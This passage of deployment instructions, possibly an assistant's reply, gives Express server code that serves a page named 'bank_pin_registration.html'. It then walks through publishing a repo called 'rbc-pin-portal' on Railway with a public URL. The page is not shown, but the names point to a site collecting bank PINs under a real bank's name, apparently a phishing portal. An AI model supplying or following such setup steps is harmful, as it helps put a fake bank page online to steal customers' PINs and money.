const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'bank_pin_registration.html'));
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
```

---

## 🚂 Step 3 — Deploy on Railway

1. Go to **[railway.app](https://railway.app)** and sign in with your GitHub account
2. Click **New Project**
3. Select **Deploy from GitHub repo**
4. Choose your `rbc-pin-portal` repository
5. Railway will **auto-detect and deploy** it
6. Wait ~2 minutes for the build to finish

---

## 🌐 Step 4 — Get Your Public URL

1. In Railway, click your project → **Settings**
2. Scroll to **Networking** → click **Generate Domain**
3. You'll get a live URL like:
   `https://rbc-pin-portal-production.up.railway.app`

---

## 📁 Your Final GitHub Repo Should Have 3 Files:
```
rbc-pin-portal/
├── bank_pin_registration.html
├── package.json
└── server.js
